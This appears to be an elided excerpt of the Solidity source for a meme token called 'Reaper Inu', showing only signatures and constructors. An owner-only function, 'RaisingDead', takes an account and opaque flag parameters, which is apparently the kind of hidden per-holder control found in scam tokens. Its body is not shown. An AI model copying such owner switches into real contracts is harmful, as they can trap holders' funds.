...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function RaisingDead(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _necromancy(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Reaper is Context, ERC20 {
    constructor(
        ...
        _necromancy(owner, initialSupply, house6, house7);
    }
}

contract ReaperInu is ERC20Reaper {
    constructor() ERC20Reaper("Reaper Inu", "REAPINU", false, true, 900, 25, msg.sender, 666000000 * 10 ** 18, msg.sender, 8) {
    }
}